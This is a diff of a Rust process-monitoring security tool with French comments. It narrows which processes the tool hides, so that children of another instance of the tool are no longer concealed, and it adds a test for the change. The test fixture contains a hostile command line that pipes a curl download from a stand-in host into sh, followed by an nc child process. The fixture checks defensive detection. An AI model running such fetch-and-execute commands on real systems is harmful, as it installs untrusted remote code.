@@ -901,15 +901,21 @@ pub(crate) fn juger_programme(p: &EnMarche, systeme: Os) -> Option<Soupcon> {
     })
 }
 
-/// Les processus de Vanguard lui-même, jamais montrés : celui-ci, ceux du même programme (une autre fenêtre, la copie
-/// élevée en administrateur), et tout ce qu'ils ont lancé (PowerShell, journalctl, ps pendant le bilan). Un parent né
-/// après son enfant n'est pas son parent : sous Windows, le numéro d'un parent mort (celui de l'explorateur, par
-/// exemple) peut avoir été repris par Vanguard, qui aurait sinon écarté l'explorateur et tout ce qu'il a lancé. Sans
-/// les deux dates, le lien est gardé. `est_vanguard` : ce processus est-il ce Vanguard (`cle::soi::Soi::est_moi`,
-/// jamais par un nom de memfd) ?
+/// Les processus de Vanguard lui-même, jamais montrés : celui-ci (`moi`) et tout ce qu'il a lancé (PowerShell,
+/// journalctl, ps pendant le bilan), et les autres processus du même programme (une autre fenêtre, la copie élevée en
+/// administrateur), eux seuls (`est_vanguard` : `cle::soi::Soi::est_moi`, jamais par un nom de memfd ni, sous Linux,
+/// par un chemin seul).
+///
+/// Ce qu'un autre Vanguard a lancé n'est plus écarté (relecture adverse du lot L2(b), 2e ronde, N1) : un programme
+/// qui lance un enfant puis se remplace (exec) par une image de Vanguard aux vrais octets est bien reconnu, mais
+/// l'enfant né avant l'exec garde ce porteur pour parent, et était caché avec toute sa descendance. Rien dans /proc ne
+/// date un exec ; seul ce processus-ci sait qu'il n'a rien lancé avant de démarrer. Les enfants légitimes d'un autre
+/// Vanguard (son journalctl, son ps, pkexec) sont donc jugés comme les autres : rien ne les signale.
+///
+/// Un parent né après son enfant n'est pas son parent : sous Windows, le numéro d'un parent mort (celui de
+/// l'explorateur, par exemple) peut avoir été repris par Vanguard, qui aurait sinon écarté l'explorateur et tout ce
+/// qu'il a lancé. Sans les deux dates, le lien est gardé.
 pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, est_vanguard: &dyn Fn(&EnMarche) -> bool) -> HashSet<u32> {
-    let mut racines: Vec<u32> = liste.iter().filter(|p| est_vanguard(p)).map(|p| p.pid).collect();
-    racines.push(moi);
     let nes: HashMap<u32, NaiveDateTime> = liste.iter().filter_map(|p| Some((p.pid, p.ne?))).collect();
     let paires: Vec<(u32, u32)> = liste
         .iter()
@@ -921,10 +927,9 @@ pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, est_vanguard: &dyn Fn(&E
             (!numero_repris).then_some((p.pid, parent))
         })
         .collect();
-    let mut ecartes: HashSet<u32> = racines.iter().copied().collect();
-    for racine in racines {
-        ecartes.extend(crate::commande::descendants(&paires, racine));
-    }
+    let mut ecartes: HashSet<u32> = liste.iter().filter(|p| est_vanguard(p)).map(|p| p.pid).collect();
+    ecartes.insert(moi);
+    ecartes.extend(crate::commande::descendants(&paires, moi));
     ecartes
 }
 
@@ -2021,6 +2026,36 @@ mod tests {
             .collect();
         let ecartes = de_vanguard(&sans, 100, &par_chemin(moi));
         assert!(ecartes.contains(&500) && ecartes.contains(&600), "{ecartes:?}");
+    }
+
+    /// HAUTE (relecture adverse du lot L2(b), 2e ronde, N1) : un autre Vanguard reconnu n'est écarté que lui-même.
+    /// Ce qu'il a lancé (ici, ce qu'un porteur avait lancé avant de se remplacer par Vanguard) reste jugé ; ce que ce
+    /// processus-ci a lancé reste écarté.
+    #[test]
+    fn un_autre_vanguard_n_ecarte_que_lui() {
+        let moi = "/opt/outils/vanguard";
+        let p = |pid: u32, parent: u32, nom: &str, chemin: Option<&str>, ligne: Option<&str>| EnMarche {
+            pid,
+            parent: Some(parent),
+            nom: nom.into(),
+            chemin: chemin.map(str::to_string),
+            ligne: ligne.map(str::to_string),
+            ..EnMarche::default()
+        };
+        let liste = vec![
+            p(100, 1, "vanguard", Some(moi), None),
+            p(110, 100, "journalctl", None, None),
+            p(400, 1, "vanguard", Some(moi), None),
+            p(410, 400, "sh", None, Some("sh -c curl https://x.example/a | sh")),
+            p(420, 410, "nc", None, None),
+        ];
+        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi));
+        assert!(ecartes.contains(&100) && ecartes.contains(&110), "{ecartes:?}");
+        assert!(ecartes.contains(&400), "{ecartes:?}");
+        assert!(
+            !ecartes.contains(&410) && !ecartes.contains(&420),
+            "ce qu'un autre Vanguard a lancé, caché : {ecartes:?}"
+        );
     }
 
     /// Garde-fou du blocage : ce qui fait tourner Vanguard (terminal, shell, session SSH) n'est jamais arrêté.
